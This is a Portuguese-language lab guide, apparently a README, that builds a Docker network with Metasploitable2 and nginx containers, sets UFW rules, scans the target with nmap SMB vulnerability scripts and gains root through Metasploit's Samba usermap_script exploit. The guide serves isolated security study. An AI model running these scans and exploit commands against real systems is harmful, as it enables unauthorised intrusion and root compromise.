

# 🌐 [SETUP] setup da rede docker

criando a rede docker &#x2013;>

    docker network create --driver bridge lab-cyber

![img](./imgs/net_ls.png)


# 🚀 [DEPLOY] deploy dos containers 🐬


## 🎯 Metasploitable2

criando o container metasploitable2 &#x2013;>

    docker run -d --name metasploitable2 \
      --network lab-cyber \
      --privileged \
      -it tleemcjr/metasploitable2 /bin/bash -c "/etc/init.d/rc 2 && /bin/bash"


## 💻 Servidores web nginx

criando os containers que simulam outros servers &#x2013;>

    docker run -d --name srv-web-corp --network lab-cyber --privileged ubuntu/nginx:latest

    docker run -d --name srv-main --network lab-cyber --privileged ubuntu/nginx:latest


# 🔍 [VALIDATION] Verificação dos containers

containers rodando &#x2013;>

    docker ps

![img](./imgs/ps.png)

verificando a network docker criada &#x2013;>

    docker network inspect lab-cyber | grep -E "Name|IPv4Address"

![img](./imgs/net.png)


# 🔑 [ACCESS] Acesso aos containers

acessando um dos servers como root &#x2013;>

    docker exec -it -u 0 srv-main /bin/bash

![img](./imgs/access.png)


# 🛡️ [HARDENING] Firewall (UFW)

configurando o ufw para estudos em um dos containers (srv-main) &#x2013;>

    ufw allow 80/tcp
    ufw allow from 172.18.0.0/24 to any port 22 proto tcp
    ufw allow from 172.18.0.3 to any port 445 proto tcp


# 🕵️ [RECON] Recon no metasploitable2

serviços rodando no metasploitable2 &#x2013;>

    sudo nmap -Pn -sS -p- 172.18.0.3

verificando o server message block (SMB) para vulnerabilidades &#x2013;>

    sudo nmap -sV -vv --script='smb-vuln-ms*' -p445 172.18.0.3 -oX result.xml


# 💥 [EXPLOITATION] SMB Remote Code Execution

explorando o Samba 3.0.20 (usermap<sub>script</sub>) para ganhar acesso root &#x2013;>

    msfconsole -q
    use exploit/multi/samba/usermap_script
    set RHOSTS 172.18.0.3
    set LHOST 172.18.0.2
    exploit

verificando o acesso obtido &#x2013;>

    whoami
    id

![img](./imgs/root_exploit.png)

